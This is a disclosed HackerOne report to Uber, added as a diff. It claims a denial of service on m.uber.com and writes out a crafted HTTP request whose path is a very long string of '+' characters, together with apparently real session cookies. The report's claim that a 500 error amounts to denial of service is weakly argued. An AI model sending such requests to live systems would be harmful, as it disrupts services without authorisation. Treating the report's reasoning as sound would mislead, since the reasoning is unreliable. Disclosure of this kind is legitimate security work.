@@ -1,0 +1,36 @@
+ReportLink:https://hackerone.com/reports/143076
+WeaknessName:Denial of Service
+Reporter:https://hackerone.com/baljeet1337
+ReportedTo:Uber(uber)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:08.07.2016 5:17:45
+
+Summary:
+
+Hi Uber , 
+
+I would like to report an issue on the domain http://m.uber.com
+Upon testing some back and forth requests to this domain , I figured out that it is possible to inject arbitrary content into the Headers of the requests .
+
+Upon increasing the size of the payload in the header , it leads to 500 Internal Sever Error , which means that this is a kind of Denial Of Service due to Arbitrary Content being Injected into the headers further leading to the Server side issue.
+
+The Crafted Vulnerable request is :
+
+```
+GET /+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ HTTP/1.1
+Host: m.uber.com
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:46.0) Gecko/20100101 Firefox/46.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Cookie: new-version=778d2a47216d87e7b709873d69a41f8eb76981b2%0A; muber-id=94847592f3264db599e73d16147e20b2; version=778d2a47216d87e7b709873d69a41f8eb76981b2%0A; muber=ontKVvFV68krtepD87MEvA.jB07dppnp7yJmEnTC0arFZEvdguZ3qFyc5liWO4xJqqmpIYgn6mMXYYLW0IDFUul6YulMeihVgcVNEGORRzlg3DBng3eKEh8VTLVEZ6qoO-m3hD-SjWMGlsfrUhEYc933q1ffoyvYdO0VSEEAkBxuc3u_3OIDF7PqLUpSZ5jEzV9IQ-3WvkttRWoavm1oojvZ0-W7bYkhjdHw978BWcNaQ.1465051938414.86400000.GqrgKNSkPZVWMA1LpdXXMefDTbaVD5duJ_PVe7GHKy4; analytics-counter=3; analytics-session=%7B%22session_id%22%3A%2265E34F48-34EF-43DA-80ED-25C2BA36D496%22%2C%22session_start_time_ms%22%3A1465051941407%7D; mp_e39a4ba8174726fb79f6a6c77b7a5247_mixpanel=%7B%22distinct_id%22%3A%20%221551be68d53181-0a3123a2d8ed408-3e6e034e-100200-1551be68d54135%22%2C%22%24initial_referrer%22%3A%20%22%24direct%22%2C%22%24initial_referring_domain%22%3A%20%22%24direct%22%7D
+Connection: close
+Cache-Control: max-age=0
+
+```
+
+The response consist of the injected Text for certain limit and there after the Server responds with 500 Internal Server error.
+
+So , this I believe turns out to be a DoS by Injecting arbitrary content in headers. 
